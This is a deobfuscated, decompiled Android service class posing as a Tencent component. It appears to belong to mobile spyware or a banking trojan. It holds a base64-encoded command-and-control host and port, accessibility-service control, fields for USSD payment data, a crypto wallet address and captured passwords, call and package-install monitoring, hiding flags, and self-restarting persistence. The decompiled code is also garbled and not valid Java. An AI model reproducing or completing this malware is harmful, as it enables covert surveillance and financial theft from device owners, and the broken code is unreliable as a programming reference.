package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: MainBackgroundService
 * Original: Lcom/tencent/tunesxconcerningn1011;
 */
public class MainBackgroundService extends Service {

    // === FIELDS ===
    public static String Afterinstalloption;
    public static String CLINAME = "Bhopdki";
    public static boolean FO_tunesxconcerningn1011_RSC = false;
    public static boolean F_tunesxconcerningn1011_ORCA = false;
    public static boolean Is_tunesxconcerningn1011_Hidden = false;
    public static List L_tunesxconcerningn1011_cl;
    public static List L_tunesxconcerningn1011_i;
    public static AccessibilityServiceCore MyAccess;
    public static String admintext;
    public static Context app_tunesxconcerningn1011_Context;
    public static BroadcastReceiver br;
    public static String[] c_tunesxconcerningn1011_mn;
    public static String currentSuccessPassword;
    public static long e_tunesxconcerningn1011_co = 0L;
    public static String ifScreenShot = "0";
    public static int inx = 0;
    public static boolean k = false;
    public static boolean k_tunesxconcerningn1011_live = false;
    public static int p_tunesxconcerningn1011_lg = 0;
    static MainBackgroundService st;
    public static String tunesxconcerningn1011_Host;
    public static String tunesxconcerningn1011_Port;
    public static String uninstall = "on";
    public static String usdtadress;
    public static String ussdamount;
    public static String ussdcard;
    public static String ussdpayd;
    public static String yrfjertunesxconcerningn1011SERBRE;
     int _IDD;
    private boolean allok;

    // === METHODS ===

    static void StaticInitializer() {
        v0 = "VHhUeFQ=";
        DataPackagingEngine.grhcriticismzfailedd31("VHhUeFQ=");
        MainBackgroundService.yrfjertunesxconcerningn1011SERBRE = "VHhUeFQ=";
        MainBackgroundService.Afterinstalloption = "C";
        MainBackgroundService.tunesxconcerningn1011_Host = "NjQuODkuMTYwLjEz";
        MainBackgroundService.tunesxconcerningn1011_Port = "Nzc3MQ==";
        v0 = -1;
        MainBackgroundService.e_tunesxconcerningn1011_co = -1;
        v0 = -1;
        MainBackgroundService.p_tunesxconcerningn1011_lg = -1;
        MainBackgroundService.inx = -1;
        v1 = "";
        v2 = "";
        v3 = "";
        v4 = "";
        v5 = "";
        v6 = "";
        v7 = "";
        v8 = "";
        v9 = "";
        v10 = "";
        v11 = "";
        v12 = "";
        v13 = "";
        v14 = "";
        v15 = "";
        v16 = "";
        v17 = "";
        MainBackgroundService.c_tunesxconcerningn1011_mn = -1;
        v0 = 0;
        MainBackgroundService.k = 0;
        MainBackgroundService.k_tunesxconcerningn1011_live = 0;
        MainBackgroundService.F_tunesxconcerningn1011_ORCA = 0;
        MainBackgroundService.FO_tunesxconcerningn1011_RSC = 0;
        MainBackgroundService.Is_tunesxconcerningn1011_Hidden = 0;
        v0 = 0;
        MainBackgroundService.MyAccess = 0;
        MainBackgroundService.ussdamount = 0;
        MainBackgroundService.ussdcard = 0;
        MainBackgroundService.ussdpayd = 0;
        MainBackgroundService.currentSuccessPassword = "";
        MainBackgroundService.usdtadress = "";
        MainBackgroundService.admintext = "";
        MainBackgroundService.br = 0;
        return;
    }

    public void Constructor() {
        // new Service()
        v0 = 0;
        v1.allok = 0;
        v0 = 4519;
        v1._IDD = 4519;
        return;
    }

    public static void D_tunesxconcerningn1011_ele(String param0) {
        v0 = ".txt";
        v1 = "/Config/sys/apps/log";
        v2 = "log-";
        v4 = Environment.getExternalStorageDirectory();
        v4 = new File();
        v5 = new StringBuilder();
        // new StringBuilder()
        v5.append(v3);
        v5.append("/Config/sys/apps/log");
        v6 = v5.toString();
        v6 = new StringBuilder();
        // new StringBuilder("log-")
        v6.append(v7);
        v6.append(".txt");
        v6.toString();
        // new File(v5, v6)
        v4.exists();
        if (v5 == null || v5 == 0) { // goto +6
        v4.delete();
        // goto (branch)
        v4 = new File();
        v5 = new StringBuilder();
        // new StringBuilder()
        v5.append(v3);
        v5.append("/Config/sys/apps/log");
        v3 = v5.toString();
        v3 = new StringBuilder();
        // new StringBuilder("log-")
        v3.append(v7);
        v3.append(".txt");
        v3.toString();
        // new File("/Config/sys/apps/log", v7)
        v4.delete();
        return;
    }

    public static String Get_tunesxconcerningn1011_Logs() {
        v0 = "";
        v1 = new StringBuilder();
        // new StringBuilder()
        Environment.getExternalStorageDirectory();
        v2 = v2.toString();
        v1.append(v2);
        v2 = "/Config/sys/apps/log";
        v1.append("/Config/sys/apps/log");
        v1.toString();
        // new File(v1)
        v2 = "/Config/sys/apps/log".listFiles();
        v2 = 0;
        v3 = "";
        v4 = v1.length;
        if (0 >= v4) { // goto +31
        v4 = new StringBuilder();
        // new StringBuilder()
        v4.append(v3);
        v3 = v1[0];
        v3 = v3.getName();
        v4.append(v3);
        v3 = "*";
        v4.append("*");
        v2 = v4.toString();
        v2 = 0 + 1;
        // goto (branch)
        return "*";
        return "";
    }

    private Boolean RegNew(IntentFilter param0) {
        if (v2 == null || v2 == 0) { // goto +40
        v0 = "android.intent.action.SCREEN_OFF";
        v2.addAction("android.intent.action.SCREEN_OFF");
        v2.addAction("android.intent.action.USER_PRESENT");
        v2.addAction("android.intent.action.ACTION_POWER_CONNECTED");
        v2.addAction("android.intent.action.ACTION_POWER_DISCONNECTED");
        // new ScreenStateReceiver()
        DataPackagingEngine.rc = "android.intent.action.ACTION_POWER_DISCONNECTED";
        v1.registerReceiver("android.intent.action.ACTION_POWER_DISCONNECTED", v2);
        v2 = 1;
        v2 = Boolean.valueOf(1);
        return 1;
        v2 = 0;
        Boolean.valueOf(0);
        return 0;
    }

    static boolean access$002(MainBackgroundService param0, boolean param1) {
        v0.allok = v1;
        return v1;
    }

    public static void cancelnotification(Context param0, int param1) {
        v0 = "notification";
        v1 = v1.getSystemService("notification");
        v1 = (NotificationManager) v1;
        v1.cancel(v2);
        return;
    }

    public IBinder onBind(Intent param0) {
        v1 = 0;
        return 0;
    }

    public void onCreate() {
        v4.onCreate();
        v0 = v4.getApplicationContext();
        MainBackgroundService.app_tunesxconcerningn1011_Context = v0;
        // goto (branch)
        v0 = 1;
        v2 = Boolean.valueOf(1);
        v2 = 1.booleanValue();
        v2 = 0;
        if (v1 == null || v1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if (v1 == null || v1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if (v1 == null || v1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if (1 == null || 1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        v2 = v4.getApplicationContext();
        v2 = 1.getResources();
        v2 = 2131296274;
        v1 = v1.getString(2131296274);
        DataPackagingEngine.p_tunesxconcerningn103_r = v1;
        v1 = MainBackgroundService.br;
        if (v1 != null && v1 != 0) { // goto +66
        v1 = new IntentFilter();
        // new IntentFilter("android.intent.action.PHONE_STATE")
        v1.addAction("android.intent.action.NEW_OUTGOING_CALL");
        v1.addAction("android.intent.extra.PHONE_NUMBER");
        v1 = new PackageMonitorReceiver();
        // new PackageMonitorReceiver()
        MainBackgroundService.br = v1;
        v1 = new IntentFilter();
        // new IntentFilter()
        v1.addAction("android.intent.action.PACKAGE_ADDED");
        v1.addAction("android.intent.action.PACKAGE_REMOVED");
        v1.addAction("android.intent.action.PACKAGE_REPLACED");
        v1.addAction("android.intent.action.PACKAGE_CHANGED");
        v1.addAction("android.intent.action.PACKAGES_SUSPENDED");
        v1.addDataScheme("package");
        v4.registerReceiver("package", v1);
        v1 = DataPackagingEngine.rc;
        if (v1 != null && v1 != 0) { // goto +12
        v1 = new IntentFilter();
        // new IntentFilter("android.intent.action.SCREEN_ON")
        v4.RegNew(v1);
        v1 = "2";
        Integer.valueOf("2");
        v3 = "2".intValue();
        DataPackagingEngine.Trys = "2";
        v3 = new MainBackgroundService$1();
        // new MainBackgroundService$1(v4, 1, "2")
        // new Thread(v3)
        "android.intent.action.SCREEN_ON".start();
        return;
    }

    public void onDestroy() {
        v6.onDestroy();
        v0 = 0;
        v0 = Boolean.valueOf(0);
        DataPackagingEngine.s_tunesxconcerningn103_f0 = 0;
        v0 = 0;
        MainBackgroundService.st = 0;
        v0 = 1;
        v2 = MainBackgroundService.app_tunesxconcerningn1011_Context;
        v3 = "Error";
        v4 = 180000;
        DataPackagingEngine.phonixeffect(v2, "Error", 180000, v5);
        // goto (branch)
        Boolean.valueOf(1);
        v2 = v2.booleanValue();
        if ("Error" == null || "Error" == 0) { // goto +4
        v2 = v1;
        // goto (branch)
        v2 = v2.booleanValue();
        if ("Error" == null || "Error" == 0) { // goto +4
        v2 = v1;
        // goto (branch)
        v2 = v2.booleanValue();
        if ("Error" == null || "Error" == 0) { // goto +4
        v2 = v1;
        // goto (branch)
        v2 = v2.booleanValue();
        if (v2 == null || v2 == 0) { // goto +4
        v2 = v1;
        // goto (branch)
        v2 = MainBackgroundService.br;
        if (v2 == null || v2 == 0) { // goto +5
        v6.unregisterReceiver(v2);
        v2 = DataPackagingEngine.rc;
        if (v2 == null || v2 == 0) { // goto +7
        v2 = DataPackagingEngine.rc;
        v6.unregisterReceiver(v2);
        v2 = new Intent();
        v6.getApplicationContext();
        // new Intent("Error", 180000)
        v2.setAction("RestartSensor");
        v6.sendBroadcast(v2);
        // goto (branch)
        Boolean.valueOf(1);
        1.booleanValue();
        if (v2 == null || v2 == 0) { // goto +4
        // goto (branch)
        1.booleanValue();
        if (v2 == null || v2 == 0) { // goto +4
        // goto (branch)
        1.booleanValue();
        if (v2 == null || v2 == 0) { // goto +4
        // goto (branch)
        1.booleanValue();
        if (1 == null || 1 == 0) { // goto +4
        // goto (branch)
        return;
    }

    public int onStartCommand(Intent param0, int param1, int param2) {
        v2 = v1.getApplicationContext();
        MainBackgroundService.app_tunesxconcerningn1011_Context = v2;
        v3 = v2.getResources();
        v3 = 2131296274;
        v2 = v2.getString(2131296274);
        DataPackagingEngine.p_tunesxconcerningn103_r = v2;
        v2 = v1.allok;
        if (v2 == null || v2 == 0) { // goto +26
        v2 = PersistentService.class;
        v2 = BackgroundServiceHelper.removedqtractort40(v2, 2131296274);
        if (v2 == null || v2 == 0) { // goto +16
        v2 = MainBackgroundService.app_tunesxconcerningn1011_Context;
        v4 = MainBackgroundService.app_tunesxconcerningn1011_Context;
        v0 = PersistentService.class;
        // new Intent(v4, v0)
        v2.startService(2131296274);
        v2 = 1;
        return 1;
        v2 = 2;
        return 2;
    }

    public void onTaskRemoved(Intent param0) {
        v3.onTaskRemoved(v4);
        v4 = MainBackgroundService.app_tunesxconcerningn1011_Context;
        v0 = "Error";
        v1 = 180000;
        DataPackagingEngine.phonixeffect(v4, "Error", 180000, v2);
        v4 = new Intent();
        v3.getApplicationContext();
        // new Intent("Error", 180000)
        v4 = v4.setAction("RestartSensor");
        v3.sendBroadcast(v4);
        // goto (branch)
        v4 = 1;
        v1 = Boolean.valueOf(1);
        v1 = 1.booleanValue();
        v1 = 0;
        if ("RestartSensor" == null || "RestartSensor" == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if ("RestartSensor" == null || "RestartSensor" == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if ("RestartSensor" == null || "RestartSensor" == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if (1 == null || 1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        return;
    }
}
